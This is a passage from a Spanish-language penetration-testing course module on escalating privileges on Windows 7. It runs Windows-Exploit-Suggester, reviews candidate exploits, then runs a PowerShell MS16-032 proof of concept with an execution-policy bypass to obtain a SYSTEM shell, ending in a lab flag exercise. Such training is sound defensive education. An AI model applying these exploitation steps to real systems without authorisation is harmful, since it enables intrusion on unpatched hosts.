Windows 7 fue declarado end-of-life el 14 de enero de 2020, pero todavía se usa en muchos entornos.

---

## Windows 7 vs. Newer Versions

A lo largo de los años, Microsoft ha añadido características de seguridad mejoradas a las versiones posteriores de Windows Desktop. La tabla a continuación muestra algunas diferencias notables entre Windows 7 y Windows 10.

| Feature                                                                                                                                                           | Windows 7 | Windows 7 | Windows 10 |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------- | --------- | ---------- |
| [Microsoft Password (MFA)](https://blogs.windows.com/windowsdeveloper/2016/01/26/convenient-two-factor-authentication-with-microsoft-passport-and-windows-hello/) |           |           | X          |
| [BitLocker](https://docs.microsoft.com/en-us/windows/security/information-protection/bitlocker/bitlocker-overview)                                                | Partial   | Partial   | X          |
| [Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard)                                       |           |           | X          |
| [Remote Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)                                          |           |           | X          |
| [Device Guard (code integrity)](https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419)     |           |           | X          |
| [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview)                | Partial   | Partial   | X          |
| [Windows Defender](https://www.microsoft.com/en-us/windows/comprehensive-security)                                                                                | Partial   | Partial   | X          |
| [Control Flow Guard](https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard)                                                                     |           |           | X          |

---

## Windows 7 Case Study

Hasta la fecha, se estima que puede haber más de 100 millones de usuarios que aún utilizan Windows 7. Según [NetMarketShare](https://www.netmarketshare.com/operating-system-market-share.aspx), en noviembre de 2020, Windows 7 era el segundo sistema operativo de escritorio más usado después de Windows 10. Windows 7 es estándar en grandes empresas de los sectores de educación, comercio minorista, transporte, salud, financiero, gubernamental y manufactura.

Como se discutió en la última sección, como penetration testers, debemos entender el negocio principal de nuestros clientes, su apetito de riesgo y las limitaciones que pueden impedirles migrar completamente de todas las versiones de sistemas EOL como Windows 7. No es suficiente darles un hallazgo sobre un sistema EOL con la recomendación de actualizar/desmantelar sin ningún contexto. Debemos tener discusiones continuas con nuestros clientes durante nuestras evaluaciones para comprender su entorno. Incluso si podemos atacar/escalar privilegios en un host Windows 7, puede haber pasos que un cliente puede tomar para limitar la exposición hasta que puedan migrar del sistema(s) EOL.

Un gran cliente minorista puede tener dispositivos Windows 7 incrustados en cientos de sus tiendas ejecutando sus sistemas de punto de venta (POS). Puede que no sea financieramente factible para ellos actualizarlos todos a la vez, por lo que es posible que necesitemos trabajar con ellos para desarrollar soluciones para mitigar el riesgo. Un gran bufete de abogados con un solo sistema Windows 7 antiguo puede actualizarlo inmediatamente o incluso eliminarlo de la red. El contexto es importante.

Vamos a observar un host Windows 7 que podríamos descubrir en uno de los sectores mencionados anteriormente. Para nuestro objetivo Windows 7, podemos usar `Sherlock` nuevamente como en el ejemplo de Server 2008, pero vamos a echar un vistazo a [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester).

### Install Python Dependencies (local VM only)

Esta herramienta funciona en el Pwnbox, pero para hacerla funcionar en una versión local de Parrot, necesitamos hacer lo siguiente para instalar las dependencias necesarias.

```r
sudo wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
sudo tar -xf setuptools-2.0.tar.gz
cd setuptools-2.0/
sudo python2.7 setup.py install

sudo wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
sudo tar -xf xlrd-1.0.0.tar.gz
cd xlrd-1.0.0/
sudo python2.7 setup.py install
```

### Gathering Systeminfo Command Output

Una vez hecho esto, necesitamos capturar la salida del comando `systeminfo` y guardarla en un archivo de texto en nuestra máquina de ataque.

```r
C:\htb> systeminfo

Host Name:                 WINLPE-WIN7
OS Name:                   Microsoft Windows 7 Professional
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          mrb3n
Registered Organization:
Product ID:                00371-222-9819843-86644
Original Install Date:     3/25/2021, 7:23:47 PM
System Boot Time:          5/13/2021, 5:14:12 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows

<SNIP>
```

### Updating the Local Microsoft Vulnerability Database

Luego, necesitamos actualizar nuestra copia local de la base de datos de Vulnerabilidades de Microsoft. Este comando guardará el contenido en un archivo Excel local.

```r
sudo python2.7 windows-exploit-suggester.py --update
```

### Running Windows Exploit Suggester

Una vez hecho esto, podemos ejecutar la herramienta contra la base de datos de vulnerabilidades para verificar posibles fallos de escalación de privilegios.

```r
python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt 

[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 3 hotfix(es) against the 386 potential bulletins(s) with a database of 137 known exploits
[*] there are now 386 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 7 SP1 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*] 
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*] 
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*] 
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
[*] 
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
[*] 
[E] MS16-059: Security Update for Windows Media Center (3150220) - Important
[*]   https://www.exploit-db.com/exploits/39805/ -- Microsoft Windows Media Center - .MCL File Processing Remote Code Execution (MS16-059), PoC
[*] 
[E] MS16-056: Security Update for Windows Journal (3156761) - Critical
[*]   https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 Java­Script­Stack­Walker Memory Corruption (MS15-056)
[*]   http://blog.skylined.nl/20161206001.html -- MSIE jscript9 Java­Script­Stack­Walker memory corruption
[*] 
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*] 

<SNIP>

[*] 
[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical
[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical
[M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical
[M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical
[M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical
[M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[*] done
```

Supongamos que hemos obtenido una shell Meterpreter en nuestro objetivo utilizando el framework Metasploit. En ese caso, también podemos usar este [local exploit suggester module](https://www.rapid7.com/blog/post/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/) que nos ayudará a encontrar rápidamente cualquier vector potencial de escalación de privilegios y ejecutarlos dentro de Metasploit si existe algún módulo.

Revisando los resultados, podemos ver una lista bastante extensa, algunos módulos de Metasploit y algunos exploits PoC independientes. Debemos filtrar el ruido, eliminar cualquier exploit de Denial of Service y los exploits que no tengan sentido para nuestro sistema operativo objetivo. Uno que destaca inmediatamente como interesante es MS16-032. Una explicación detallada de este error se puede encontrar en este [Project Zero blog post](https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html), que es un error en el Secondary Logon Service.

### Exploiting MS16-032 with PowerShell PoC

Vamos a usar un [PowerShell PoC](https://www.exploit-db.com/exploits/39719) para intentar explotar esto y elevar nuestros privilegios.

```r
PS C:\htb> Set-ExecutionPolicy bypass -scope process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic. Do you want to change the execution
policy?
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): A
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y


PS C:\htb> Import-Module .\Invoke-MS16-032.ps1
PS C:\htb> Invoke-MS16-032

         __ __ ___ ___   ___     ___ ___ ___
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|

                       [by b33f -> @FuzzySec]

[?] Operating system core count: 6
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1656

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 1652
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!
```

### Spawning a SYSTEM Console

Esto funciona y generamos una consola cmd del sistema.

```r
C:\htb> whoami

nt authority\system
```

---

## Attacking Windows 7

Tomando los ejemplos de enumeración que hemos visto en este módulo, accede al sistema a continuación, encuentra una manera de escalar a acceso de nivel `NT AUTHORITY\SYSTEM` (puede haber más de una manera), y envía el archivo `flag.txt` en el escritorio del Administrador. Después de replicar los pasos anteriores, desafíate a usar otro método para escalar privilegios en el host objetivo.
